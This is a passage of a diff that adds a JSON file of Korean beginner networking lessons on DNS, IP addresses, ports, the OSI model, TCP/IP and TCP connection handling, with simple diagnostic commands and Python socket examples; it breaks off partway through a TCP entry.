@@ -1,0 +1,1224 @@
+{
+  "01_기초/dns": {
+    "id": "01_기초/dns",
+    "title": "DNS",
+    "category": "network",
+    "subCategory": "01_기초",
+    "language": "Python",
+    "description": "Domain Name System의 원리를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 DNS란?",
+        "content": "## 🔥 한 줄 요약\n> **인터넷의 전화번호부** - 이름을 IP 주소로 바꿔주는 시스템!\n\n---\n\n## 💡 왜 필요한가?\n\n### 비유로 이해하기:\n```\n📱 핸드폰 연락처\n├── \"엄마\" → 010-1234-5678\n├── \"친구\" → 010-8765-4321\n└── 이름만 알면 전화 가능!\n\n🌐 DNS\n├── \"naver.com\" → 223.130.200.107\n├── \"google.com\" → 142.250.196.110\n└── 도메인만 알면 접속 가능!\n```\n\n### DNS 없다면?\n```\n❌ \"223.130.200.107 접속해서 검색해\"\n❌ \"142.250.196.110 가서 메일 확인해\"\n\n✅ \"네이버 가서 검색해\"\n✅ \"구글 가서 메일 확인해\"\n\n→ 사람이 기억하기 쉬운 이름 사용!\n```\n\n---\n\n## 🎯 DNS 동작 과정\n\n### 1단계: naver.com 입력\n\n```\n                    ┌─────────────────┐\n                    │  DNS 서버들     │\n                    │                 │\n  naver.com → ?     │  ① 루트 DNS    │\n      │             │  ② .com DNS    │\n      ▼             │  ③ naver DNS   │\n┌──────────┐        └────────┬────────┘\n│ 브라우저  │◄───────────────┘\n│          │     223.130.200.107\n└──────────┘\n```\n\n### 2단계: 캐싱\n\n```\n다음에 또 naver.com 접속하면?\n\n1. 브라우저 캐시 확인 → 있으면 바로 사용\n2. OS 캐시 확인 → 있으면 바로 사용\n3. 공유기 캐시 확인 → 있으면 바로 사용\n4. ISP DNS 캐시 → 있으면 바로 사용\n5. 없으면 다시 질의\n\n→ 캐싱으로 속도 향상!\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 DNS 명령어",
+        "content": "### DNS 조회\n\n```bash\n# nslookup: DNS 조회\nnslookup naver.com\n\n# 결과:\n# Server: 168.126.63.1 (DNS 서버)\n# Name: naver.com\n# Address: 223.130.200.107\n\n# dig: 더 상세한 정보 (Mac/Linux)\ndig naver.com\n\n# 특정 DNS 서버로 조회\nnslookup naver.com 8.8.8.8\n```\n\n### DNS 캐시 관리\n\n```bash\n# Windows: DNS 캐시 비우기\nipconfig /flushdns\n\n# Mac\nsudo dscacheutil -flushcache\nsudo killall -HUP mDNSResponder\n\n# Linux\nsudo systemctl restart systemd-resolved\n```\n\n### hosts 파일 수정 (로컬 DNS)\n\n```bash\n# Windows: C:\\Windows\\System32\\drivers\\etc\\hosts\n# Mac/Linux: /etc/hosts\n\n# 파일 내용:\n127.0.0.1   localhost\n127.0.0.1   myapp.local    # 개발용 도메인\n192.168.0.10  dev-server   # 팀 내부 서버\n\n# → myapp.local 입력하면 127.0.0.1로 연결\n# → 개발 시 유용!\n```\n\n### Python DNS 조회\n\n```python\nimport socket\n\n# 도메인 → IP\nip = socket.gethostbyname('naver.com')\nprint(ip)  # 223.130.200.107\n\n# IP → 도메인 (역방향)\ndomain = socket.gethostbyaddr('8.8.8.8')\nprint(domain)  # ('dns.google', ...)\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 꿀팁",
+        "content": "### 추천 DNS 서버\n\n```\n🔵 Google DNS\n├── 8.8.8.8 (주)\n└── 8.8.4.4 (보조)\n\n🟠 Cloudflare DNS\n├── 1.1.1.1 (주)\n└── 1.0.0.1 (보조)\n└── 가장 빠름!\n\n🟢 통신사 기본 DNS\n└── 자동 설정됨\n```\n\n### DNS 문제 해결\n\n```\n\"사이트에 연결할 수 없습니다\"\n\n1. DNS 캐시 비우기\n2. 다른 DNS로 변경 (8.8.8.8)\n3. nslookup으로 확인\n4. 공유기 재시작\n```\n\n### TTL (Time To Live)\n\n```\nDNS 캐시 유지 시간\n\nTTL 짧음 (300초 = 5분)\n├── 서버 이전 시 빠른 전환\n└── DNS 조회 잦음\n\nTTL 길음 (86400초 = 24시간)\n├── 캐시로 빠른 응답\n└── 변경 반영 느림\n```"
+      }
+    ]
+  },
+  "01_기초/ip-address": {
+    "id": "01_기초/ip-address",
+    "title": "IP 주소",
+    "category": "network",
+    "subCategory": "01_기초",
+    "language": "Python",
+    "description": "IP 주소의 개념과 체계를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 IP 주소란?",
+        "content": "## 🔥 한 줄 요약\n> **인터넷 세계의 집 주소** - 컴퓨터를 찾아가는 번호!\n\n---\n\n## 💡 왜 배워야 하나?\n\n### 실생활 비유:\n```\n🏠 현실 세계: \"서울시 강남구 테헤란로 123\"\n🌐 인터넷: \"192.168.0.1\"\n\n→ 주소가 있어야 택배(데이터)가 도착!\n```\n\n### 개발자가 알아야 하는 이유:\n```\n서버 배포 → IP 주소 설정\nAPI 호출 → 서버 IP 필요\n보안 설정 → IP 화이트리스트\n디버깅 → IP로 문제 추적\n```\n\n---\n\n## 🎯 핵심 개념\n\n### IPv4 주소 구조\n\n```\n192.168.0.1\n\n각 숫자: 0~255 (8비트)\n총 4개: 32비트\n\n→ 약 43억 개 주소 가능\n→ 근데 전세계 인구 80억... 부족!\n```\n\n### 특별한 IP 주소들\n\n```\n🏠 127.0.0.1 (localhost)\n└── 내 컴퓨터 자기 자신\n└── 개발할 때 \"내 PC에서 테스트\"\n\n🏢 192.168.x.x, 10.x.x.x, 172.16~31.x.x\n└── 사설 IP (집/회사 내부용)\n└── 인터넷에서 직접 접근 불가\n\n🌍 그 외\n└── 공인 IP (인터넷용)\n└── 전세계에서 유일한 주소\n```\n\n### IPv4 vs IPv6\n\n```\nIPv4: 192.168.0.1\n├── 32비트, 약 43억 개\n├── 거의 고갈됨!\n└── 지금 대부분 사용\n\nIPv6: 2001:0db8:85a3:0000:0000:8a2e:0370:7334\n├── 128비트, 거의 무한대\n├── 340간 개 (340,000,000,000,000,000,000,000,000,000,000,000,000)\n└── 서서히 전환 중\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 IP 주소 다루기",
+        "content": "### 내 IP 확인\n\n```bash\n# 사설 IP (내부 네트워크)\n# Windows\nipconfig | findstr \"IPv4\"\n\n# Mac/Linux\nifconfig | grep inet\n\n# 공인 IP (외부에서 보이는 주소)\ncurl ifconfig.me\n# 또는 네이버에서 \"내 IP 주소\" 검색\n```\n\n### Python에서 IP 다루기\n\n```python\nimport socket\n\n# 내 컴퓨터 IP\nhostname = socket.gethostname()\nmy_ip = socket.gethostbyname(hostname)\nprint(f\"내 IP: {my_ip}\")\n\n# 도메인 → IP 변환\nnaver_ip = socket.gethostbyname(\"naver.com\")\nprint(f\"네이버 IP: {naver_ip}\")\n\n# IP 유효성 검사\nimport ipaddress\n\ntry:\n    ip = ipaddress.ip_address(\"192.168.0.1\")\n    print(f\"유효한 IPv{ip.version} 주소\")\nexcept ValueError:\n    print(\"잘못된 IP 주소\")\n```\n\n### 서버 설정 예시\n\n```python\n# Flask 서버\nfrom flask import Flask\napp = Flask(__name__)\n\n# 0.0.0.0 = 모든 IP에서 접근 허용\napp.run(host='0.0.0.0', port=5000)\n\n# 127.0.0.1 = 내 컴퓨터에서만 접근\napp.run(host='127.0.0.1', port=5000)\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 꿀팁",
+        "content": "### 자주 쓰는 IP\n\n```\n127.0.0.1 = 내 컴퓨터 (localhost)\n0.0.0.0 = 모든 IP (서버 바인딩용)\n192.168.0.1 = 보통 공유기 주소\n8.8.8.8 = 구글 DNS 서버\n1.1.1.1 = 클라우드플레어 DNS\n```\n\n### 공인 IP vs 사설 IP\n\n```\n집에서 인터넷 할 때:\n내 PC (192.168.0.10)\n    ↓\n공유기 (192.168.0.1 / 공인IP: 210.xxx.xxx.xxx)\n    ↓\n인터넷\n\n→ 외부에선 공인 IP만 보임\n→ 집 안의 여러 기기가 하나의 공인 IP 공유\n→ 이게 NAT (Network Address Translation)\n```"
+      }
+    ]
+  },
+  "01_기초/network-intro": {
+    "id": "01_기초/network-intro",
+    "title": "네트워크 소개",
+    "category": "network",
+    "subCategory": "01_기초",
+    "language": "Python",
+    "description": "네트워크의 기본 개념을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 네트워크란?",
+        "content": "## 🔥 한 줄 요약\n> **컴퓨터들이 서로 대화하는 방법** - 카톡처럼 메시지 주고받기!\n\n---\n\n## 💡 왜 배워야 하나?\n\n### 실생활 예시:\n```\n📱 카카오톡 메시지 보내기\n├── 내 폰 → 인터넷 → 카카오 서버 → 친구 폰\n└── 이게 다 네트워크!\n\n🎮 롤 게임하기\n├── 내 PC → 인터넷 → 라이엇 서버 → 다른 플레이어들\n└── 0.01초 안에 데이터 전송!\n\n📺 넷플릭스 보기\n├── 넷플릭스 서버 → 인터넷 → 우리 집 TV\n└── 1초에 수백 MB 전송!\n```\n\n### 개발자에게 필수인 이유:\n```\n🔴 네트워크 모르면 생기는 일\n├── API 에러 원인 못 찾음\n├── \"왜 느려요?\" 답 못함\n├── 보안 취약점 못 막음\n└── 면접에서 탈락\n\n🟢 네트워크 알면\n├── 버그 원인 빠르게 파악\n├── 성능 최적화 가능\n├── 보안 이슈 대응 가능\n└── 시니어 개발자 필수 역량\n```\n\n---\n\n## 🎯 핵심 개념\n\n### 📬 편지 보내기로 이해하기\n\n```\n인터넷 = 전세계 우체국 네트워크\n\n1. 편지 쓰기 = 데이터 만들기\n2. 봉투에 주소 적기 = IP 주소 붙이기\n3. 우체국에 맡기기 = 공유기로 전송\n4. 여러 우체국 거쳐 전달 = 라우터들 통과\n5. 도착! = 서버가 데이터 받음\n```\n\n### 네트워크 구성요소\n\n```\n🖥️ 클라이언트: 요청하는 쪽 (내 폰, 내 PC)\n🏢 서버: 응답하는 쪽 (네이버, 구글)\n🔀 라우터: 길 안내 (데이터 어디로 보낼지)\n📡 스위치: 같은 네트워크 내 연결\n🌐 인터넷: 전세계 네트워크들의 연결\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 네트워크 확인하기",
+        "content": "### 내 네트워크 정보 확인\n\n```bash\n# Windows\nipconfig\n\n# Mac/Linux\nifconfig\n# 또는\nip addr\n\n# 결과 예시:\n# IPv4 주소: 192.168.0.10  ← 내 컴퓨터 주소\n# 서브넷 마스크: 255.255.255.0\n# 기본 게이트웨이: 192.168.0.1  ← 공유기 주소\n```\n\n### 서버에 연결 테스트\n\n```bash\n# ping: 서버가 살아있나 확인\nping google.com\n\n# 결과:\n# 64 bytes from 142.250.196.110: time=30ms\n# → 30ms 만에 응답! (빠름)\n\n# traceroute: 어떤 경로로 가는지\ntraceroute google.com\n# Mac: traceroute, Windows: tracert\n\n# 결과:\n# 1. 192.168.0.1 (우리 집 공유기)\n# 2. 211.xxx.xxx.1 (통신사)\n# 3. ... (여러 라우터)\n# 10. 142.250.196.110 (구글 서버)\n```\n\n### 웹사이트 정보 확인\n\n```bash\n# nslookup: 도메인 → IP 변환\nnslookup naver.com\n\n# 결과:\n# Name: naver.com\n# Address: 223.130.200.107\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 꿀팁",
+        "content": "### 네트워크 학습 순서\n\n```\n1단계: 기초 용어\n├── IP 주소, 포트, DNS\n└── 인터넷이 어떻게 작동하는지\n\n2단계: 프로토콜\n├── TCP vs UDP\n├── HTTP/HTTPS\n└── 왜 규칙이 필요한지\n\n3단계: 웹 통신\n├── REST API\n├── 인증 (JWT, 세션)\n└── 실제 서비스에서 어떻게 쓰는지\n\n4단계: 심화\n├── WebSocket\n├── 로드밸런싱\n└── 대규모 트래픽 처리\n```\n\n### 실습 추천\n\n```\n1. 브라우저 개발자 도구 → Network 탭\n2. Postman으로 API 테스트\n3. 간단한 서버 만들어보기\n```"
+      }
+    ]
+  },
+  "01_기초/osi-7-layer": {
+    "id": "01_기초/osi-7-layer",
+    "title": "OSI 7계층",
+    "category": "network",
+    "subCategory": "01_기초",
+    "language": "Python",
+    "description": "OSI 모델의 각 계층을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 OSI 7계층이란?",
+        "content": "## 🔥 한 줄 요약\n> **네트워크 통신을 7단계로 나눈 것** - 택배 배송 과정처럼!\n\n---\n\n## 💡 왜 알아야 하나?\n\n### 면접 단골 질문:\n```\n\"OSI 7계층 설명해주세요\"\n\"HTTP는 몇 계층인가요?\"\n\"TCP와 UDP의 차이는?\"\n\n→ 네트워크 기본기 확인용!\n```\n\n### 실무에서:\n```\n\"3계층 문제 같아요\" = 라우팅/IP 문제\n\"4계층 문제 같아요\" = TCP/UDP 문제\n\"7계층 문제 같아요\" = 애플리케이션 문제\n\n→ 문제 범위 좁히기!\n```\n\n---\n\n## 🎯 7계층 한눈에 보기\n\n```\n택배 보내기 비유:\n\n7. 응용 계층    = 주문서 작성 (무엇을 보낼지)\n6. 표현 계층    = 포장하기 (압축, 암호화)\n5. 세션 계층    = 배송 추적번호 (연결 관리)\n4. 전송 계층    = 택배 선택 (빠른배송 vs 일반)\n3. 네트워크 계층 = 배송 경로 (어느 길로?)\n2. 데이터링크   = 차에 싣기 (다음 정류장까지)\n1. 물리 계층    = 도로, 트럭 (실제 이동)\n```\n\n### 계층별 정리\n\n| 계층 | 이름 | 하는 일 | 예시 |\n|-----|------|--------|------|\n| 7 | 응용 | 사용자 서비스 | HTTP, FTP, SMTP |\n| 6 | 표현 | 데이터 변환 | 암호화, 압축 |\n| 5 | 세션 | 연결 관리 | 로그인 유지 |\n| 4 | 전송 | 신뢰성 보장 | TCP, UDP |\n| 3 | 네트워크 | 경로 결정 | IP, 라우터 |\n| 2 | 데이터링크 | 물리주소 | MAC, 스위치 |\n| 1 | 물리 | 전기신호 | 케이블, 허브 |"
+      },
+      {
+        "type": "code",
+        "title": "💻 계층별 상세",
+        "content": "### 개발자가 주로 다루는 계층\n\n```\n┌─────────────────────────────────────┐\n│ 7계층: HTTP, HTTPS, WebSocket       │ ← 웹 개발\n│ (우리가 만드는 API, 웹사이트)         │\n├─────────────────────────────────────┤\n│ 4계층: TCP, UDP                     │ ← 네트워크 설정\n│ (연결 신뢰성, 속도)                  │\n├─────────────────────────────────────┤\n│ 3계층: IP                           │ ← 서버 배포\n│ (주소, 라우팅)                       │\n├─────────────────────────────────────┤\n│ 1~2계층: 이더넷, WiFi               │ ← 인프라팀\n│ (하드웨어)                          │\n└─────────────────────────────────────┘\n```\n\n### 데이터 전송 과정\n\n```\n보내는 쪽 (캡슐화):\n[데이터] → HTTP 헤더 추가 (7계층)\n[HTTP+데이터] → TCP 헤더 추가 (4계층)\n[TCP+HTTP+데이터] → IP 헤더 추가 (3계층)\n[IP+TCP+HTTP+데이터] → 이더넷 헤더 (2계층)\n[전기 신호로 변환] (1계층)\n\n받는 쪽 (역캡슐화):\n역순으로 헤더 제거하며 데이터 추출\n```\n\n### 실제 HTTP 요청 흐름\n\n```\n1. 브라우저: HTTP 요청 생성 (7계층)\n   GET /index.html HTTP/1.1\n\n2. OS: TCP 연결 (4계층)\n   3-way handshake\n\n3. OS: IP 패킷 생성 (3계층)\n   출발: 192.168.0.10\n   도착: 223.130.200.107\n\n4. 네트워크 카드: 전송 (1~2계층)\n   이더넷 프레임으로 전송\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 꿀팁",
+        "content": "### 암기법\n\n```\n7 - Application  (앱)\n6 - Presentation (프레젠테이션)\n5 - Session      (세션)\n4 - Transport    (전송)\n3 - Network      (네트워크)\n2 - Data Link    (데이터 링크)\n1 - Physical     (물리)\n\n영어: \"All People Seem To Need Data Processing\"\n한글: \"앞 표 세 트 네 대 피\"\n```\n\n### OSI vs TCP/IP 모델\n\n```\nOSI 7계층    TCP/IP 4계층\n─────────────────────────\n7 응용      ┐\n6 표현      ├─ 응용 계층 (HTTP)\n5 세션      ┘\n4 전송      ─── 전송 계층 (TCP/UDP)\n3 네트워크   ─── 인터넷 계층 (IP)\n2 데이터링크 ┐\n1 물리      ┴─ 네트워크 접근 계층\n\n→ 실무에서는 TCP/IP 모델 더 많이 사용\n```"
+      }
+    ]
+  },
+  "01_기초/port": {
+    "id": "01_기초/port",
+    "title": "포트 (Port)",
+    "category": "network",
+    "subCategory": "01_기초",
+    "language": "Python",
+    "description": "포트의 개념과 역할을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 포트란?",
+        "content": "## 🔥 한 줄 요약\n> **컴퓨터 안의 문 번호** - IP가 아파트라면, 포트는 호수!\n\n---\n\n## 💡 왜 필요한가?\n\n### 비유로 이해하기:\n```\n🏢 아파트 (= 컴퓨터, IP 주소)\n├── 101호: 웹 서버 (포트 80)\n├── 102호: 이메일 서버 (포트 25)\n├── 103호: 게임 서버 (포트 3000)\n└── 104호: 데이터베이스 (포트 3306)\n\n→ 하나의 컴퓨터에서 여러 서비스 동시 운영!\n```\n\n### 실제 예시:\n```\nhttp://naver.com = http://naver.com:80\nhttps://google.com = https://google.com:443\nlocalhost:3000 = React 개발 서버\nlocalhost:8080 = Spring 서버\n```\n\n---\n\n## 🎯 핵심 개념\n\n### 포트 번호 범위\n\n```\n0 ~ 65535 (총 65,536개)\n\n🔒 Well-Known Ports (0-1023)\n├── 80: HTTP (웹)\n├── 443: HTTPS (보안 웹)\n├── 22: SSH (원격 접속)\n├── 21: FTP (파일 전송)\n├── 25: SMTP (이메일 발송)\n└── 관리자 권한 필요\n\n📋 Registered Ports (1024-49151)\n├── 3000: React 기본 포트\n├── 3306: MySQL\n├── 5432: PostgreSQL\n├── 6379: Redis\n├── 8080: 대체 HTTP\n└── 일반적인 애플리케이션\n\n🎲 Dynamic Ports (49152-65535)\n└── 임시 사용 (브라우저 등)\n```\n\n### 자주 쓰는 포트\n\n```\n웹: 80 (HTTP), 443 (HTTPS)\nDB: 3306 (MySQL), 5432 (Postgres), 27017 (MongoDB)\n개발: 3000 (React), 8080 (Spring), 5000 (Flask)\n기타: 22 (SSH), 6379 (Redis)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 포트 다루기",
+        "content": "### 사용 중인 포트 확인\n\n```bash\n# Windows\nnetstat -ano | findstr :3000\n\n# Mac/Linux\nlsof -i :3000\n# 또는\nnetstat -tlnp | grep 3000\n\n# 결과 예시:\n# TCP  127.0.0.1:3000  LISTENING  1234\n# → 프로세스 1234가 3000번 포트 사용 중\n```\n\n### 포트 충돌 해결\n\n```bash\n# \"포트가 이미 사용 중입니다\" 에러 시\n\n# 1. 누가 쓰는지 확인\nlsof -i :3000\n\n# 2. 해당 프로세스 종료\nkill -9 [PID]\n\n# 또는 다른 포트 사용\nnpm start -- --port 3001\n```\n\n### 서버 포트 설정\n\n```python\n# Flask\napp.run(port=5000)\n\n# Express.js\napp.listen(3000, () => {\n    console.log('서버 시작: http://localhost:3000')\n})\n\n# Spring Boot (application.properties)\nserver.port=8080\n```\n\n### 방화벽 포트 열기\n\n```bash\n# Linux (UFW)\nsudo ufw allow 80\nsudo ufw allow 443\nsudo ufw allow 3000\n\n# Windows (관리자 권한)\nnetsh advfirewall firewall add rule name=\"Open 3000\" dir=in action=allow protocol=TCP localport=3000\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 꿀팁",
+        "content": "### 포트 선택 가이드\n\n```\n✅ 개발 시\n├── 이미 알려진 포트 피하기\n├── 3000, 8000, 8080 등 사용\n└── 팀 내 규칙 정하기\n\n✅ 배포 시\n├── 웹: 80, 443 사용\n├── 리버스 프록시로 내부 포트 숨기기\n└── 불필요한 포트 방화벽 차단\n```\n\n### URL과 포트\n\n```\nhttp://example.com:80/page\nhttps://example.com:443/page\n\n→ 80, 443은 생략 가능 (기본 포트)\n→ http://example.com = http://example.com:80\n```"
+      }
+    ]
+  },
+  "01_기초/tcp-ip": {
+    "id": "01_기초/tcp-ip",
+    "title": "TCP/IP",
+    "category": "network",
+    "subCategory": "01_기초",
+    "language": "Python",
+    "description": "TCP/IP 프로토콜 스택을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 TCP/IP란?",
+        "content": "## 🔥 한 줄 요약\n> **인터넷의 공용어** - 전세계 컴퓨터가 대화하는 규칙!\n\n---\n\n## 💡 왜 알아야 하나?\n\n```\n🌍 전세계 인터넷 = TCP/IP 사용\n├── 웹사이트 접속 = HTTP (TCP 기반)\n├── 파일 다운로드 = FTP (TCP 기반)\n├── 이메일 전송 = SMTP (TCP 기반)\n└── 동영상 스트리밍 = UDP 기반\n\n→ TCP/IP 이해 = 인터넷 이해!\n```\n\n---\n\n## 🎯 TCP/IP 4계층\n\n```\n┌───────────────────────────────┐\n│  4. 응용 계층 (Application)    │\n│  HTTP, FTP, SMTP, DNS         │\n│  \"무슨 내용을 보낼까?\"          │\n├───────────────────────────────┤\n│  3. 전송 계층 (Transport)      │\n│  TCP, UDP                     │\n│  \"어떻게 보낼까? (믿을 수 있게/빠르게)\" │\n├───────────────────────────────┤\n│  2. 인터넷 계층 (Internet)      │\n│  IP, ICMP                     │\n│  \"어디로 보낼까? (주소)\"         │\n├───────────────────────────────┤\n│  1. 네트워크 접근 계층          │\n│  Ethernet, WiFi               │\n│  \"물리적으로 어떻게? (케이블, 무선)\" │\n└───────────────────────────────┘\n```\n\n### TCP vs UDP\n\n```\n📦 TCP (Transmission Control Protocol)\n├── 신뢰성 있는 전송\n├── 순서 보장\n├── 느리지만 확실\n└── 예: 웹, 이메일, 파일 전송\n\n🚀 UDP (User Datagram Protocol)\n├── 빠른 전송\n├── 순서 보장 X\n├── 손실 가능하지만 빠름\n└── 예: 게임, 스트리밍, DNS\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 TCP/IP 실습",
+        "content": "### TCP 통신 (Python)\n\n```python\n# 서버\nimport socket\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP\nserver.bind(('0.0.0.0', 8080))\nserver.listen(5)\n\nwhile True:\n    client, addr = server.accept()\n    print(f\"연결: {addr}\")\n    data = client.recv(1024)\n    client.send(b\"Hello!\")\n    client.close()\n\n# 클라이언트\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect(('localhost', 8080))\nclient.send(b\"Hi!\")\nresponse = client.recv(1024)\nprint(response)\nclient.close()\n```\n\n### UDP 통신 (Python)\n\n```python\n# 서버\nimport socket\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP\nserver.bind(('0.0.0.0', 8080))\n\nwhile True:\n    data, addr = server.recvfrom(1024)\n    print(f\"받음: {data} from {addr}\")\n    server.sendto(b\"OK\", addr)\n\n# 클라이언트\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nclient.sendto(b\"Hello\", ('localhost', 8080))\nresponse, _ = client.recvfrom(1024)\nprint(response)\n```\n\n### 네트워크 상태 확인\n\n```bash\n# 현재 TCP 연결 상태\nnetstat -an | grep ESTABLISHED\n\n# 특정 포트 연결 확인\nnetstat -an | grep :80\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 정리",
+        "content": "### TCP/IP vs OSI\n\n```\nTCP/IP가 실제 표준!\nOSI는 이론적 모델\n\n실무에서는 TCP/IP 용어 사용:\n├── \"IP 주소\" (3계층)\n├── \"TCP 연결\" (4계층)\n├── \"HTTP 요청\" (7계층)\n```\n\n### 언제 TCP? 언제 UDP?\n\n```\nTCP 사용:\n├── 데이터 정확성 중요\n├── 순서 중요\n├── 웹, 이메일, 파일 전송\n\nUDP 사용:\n├── 속도 중요\n├── 약간의 손실 OK\n├── 게임, 라이브 스트리밍, VoIP\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/4way-handshake": {
+    "id": "02_TCP_UDP/4way-handshake",
+    "title": "4-Way Handshake",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP 연결 종료의 4단계를 상세히 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 4-Way Handshake 심화",
+        "content": "## 🎯 각 단계 상세\n\n### FIN_WAIT 상태들\n\n```\n클라이언트가 먼저 종료 요청 시:\n\nFIN_WAIT_1: FIN 보내고 ACK 기다림\n     ↓ (ACK 받음)\nFIN_WAIT_2: 상대방 FIN 기다림\n     ↓ (FIN 받음)\nTIME_WAIT: 마지막 ACK 보내고 대기\n     ↓ (2MSL 후)\nCLOSED: 완전 종료\n```\n\n### CLOSE_WAIT 위험\n\n```\n서버에 CLOSE_WAIT 많으면 위험!\n\n원인:\n├── 클라이언트가 FIN 보냈는데\n├── 서버가 close() 안 함\n└── 리소스 누수!\n\n해결:\n├── 코드에서 socket.close() 확실히\n├── try-finally 또는 with문 사용\n└── 타임아웃 설정\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 안전한 종료",
+        "content": "### 올바른 소켓 종료\n\n```python\n# ❌ 나쁜 예\nclient = socket.socket()\nclient.connect(...)\nclient.send(...)\n# close() 깜빡!\n\n# ✅ 좋은 예 (try-finally)\nclient = socket.socket()\ntry:\n    client.connect(...)\n    client.send(...)\nfinally:\n    client.close()\n\n# ✅ 더 좋은 예 (with문)\nwith socket.socket() as client:\n    client.connect(...)\n    client.send(...)\n# 자동으로 close()\n```\n\n### 반쪽 종료 (Half-Close)\n\n```python\n# shutdown()으로 송신만 종료\nclient.shutdown(socket.SHUT_WR)  # 쓰기 종료\n# 아직 읽기는 가능!\ndata = client.recv(1024)\nclient.close()  # 완전 종료\n\n# SHUT_RD: 읽기 종료\n# SHUT_WR: 쓰기 종료\n# SHUT_RDWR: 양쪽 종료\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 트러블슈팅",
+        "content": "### 상태별 대응\n\n```\nTIME_WAIT 많음:\n├── 정상 (클라이언트)\n├── 비정상 (서버) → SO_REUSEADDR\n\nCLOSE_WAIT 많음:\n├── 코드 버그!\n└── close() 누락 확인\n\nFIN_WAIT_2 오래 지속:\n├── 상대방이 FIN 안 보냄\n└── 타임아웃 설정 필요\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/tcp-concept": {
+    "id": "02_TCP_UDP/tcp-concept",
+    "title": "TCP 개념",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP의 핵심 개념을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 TCP란?",
+        "content": "## 🔥 한 줄 요약\n> **신뢰할 수 있는 택배 서비스** - 확실하게 도착 보장!\n\n---\n\n## 💡 TCP의 특징\n\n### 택배로 비유:\n```\n📦 TCP = 등기 우편\n├── 배달 확인증 받음 (ACK)\n├── 분실 시 재배송 (재전송)\n├── 순서대로 도착 (순서 보장)\n└── 느리지만 확실!\n\n📨 UDP = 일반 우편\n├── 보내면 끝\n├── 도착 확인 X\n├── 순서 뒤죽박죽 가능\n└── 빠르지만 불확실\n```\n\n---\n\n## 🎯 TCP 핵심 특징\n\n### 1. 연결 지향\n\n```\n통화하기 전에 전화 연결하는 것처럼\n데이터 보내기 전에 연결 먼저!\n\n클라이언트 ──────── 서버\n    │   \"연결해도 돼?\" (SYN)\n    │─────────────────────▶│\n    │   \"응, 나도 연결!\" (SYN+ACK)\n    │◀─────────────────────│\n    │   \"확인!\" (ACK)\n    │─────────────────────▶│\n    └── 이제 데이터 전송 ──┘\n```\n\n### 2. 신뢰성 보장\n\n```\n모든 데이터 도착 확인\n\n보내는 쪽: \"데이터 1번 보냄\"\n받는 쪽:   \"1번 받았어! (ACK)\"\n보내는 쪽: \"데이터 2번 보냄\"\n받는 쪽:   (응답 없음... 손실!)\n보내는 쪽: \"2번 다시 보냄\" (재전송)\n받는 쪽:   \"2번 받았어! (ACK)\"\n```\n\n### 3. 순서 보장\n\n```\n데이터가 순서대로 도착\n\n보낸 순서: 1, 2, 3, 4, 5\n도착 순서: 1, 3, 2, 5, 4 (네트워크에서 뒤섞임)\n재조립 후: 1, 2, 3, 4, 5 (TCP가 정리!)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 TCP 통신",
+        "content": "### TCP 서버 (Python)\n\n```python\nimport socket\n\n# TCP 서버\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nserver.bind(('0.0.0.0', 8080))\nserver.listen(5)  # 최대 5개 대기\n\nprint(\"서버 시작: 8080 포트\")\n\nwhile True:\n    client_socket, addr = server.accept()\n    print(f\"연결됨: {addr}\")\n\n    # 데이터 받기\n    data = client_socket.recv(1024).decode()\n    print(f\"받은 데이터: {data}\")\n\n    # 응답 보내기\n    client_socket.send(f\"받았어요: {data}\".encode())\n\n    client_socket.close()\n```\n\n### TCP 클라이언트 (Python)\n\n```python\nimport socket\n\n# TCP 클라이언트\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect(('localhost', 8080))\n\n# 데이터 보내기\nclient.send(\"안녕하세요!\".encode())\n\n# 응답 받기\nresponse = client.recv(1024).decode()\nprint(f\"서버 응답: {response}\")\n\nclient.close()\n```\n\n### 연결 상태 확인\n\n```bash\n# TCP 연결 상태 보기\nnetstat -an | grep ESTABLISHED\nnetstat -an | grep LISTEN\nnetstat -an | grep TIME_WAIT\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 TCP 상태",
